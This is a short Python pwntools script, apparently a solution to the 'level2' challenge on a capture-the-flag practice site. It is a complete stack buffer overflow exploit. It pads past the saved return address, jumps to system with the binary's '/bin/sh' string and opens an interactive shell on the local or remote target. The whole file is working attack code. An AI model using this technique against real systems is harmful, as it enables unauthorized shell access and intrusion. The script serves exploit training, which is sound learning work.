#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
import sys
context.binary = "./level2"

if sys.argv[1] == "l":
    io = process("./level2")
else:
    io = remote('pwn2.jarvisoj.com', 9878)

elf = ELF('./level2')
payload = flat(cyclic(0x88 + 4), elf.sym['system'], 'aaaa', next(elf.search("/bin/sh")))
io.sendlineafter("Input:\n", payload)

io.interactive()
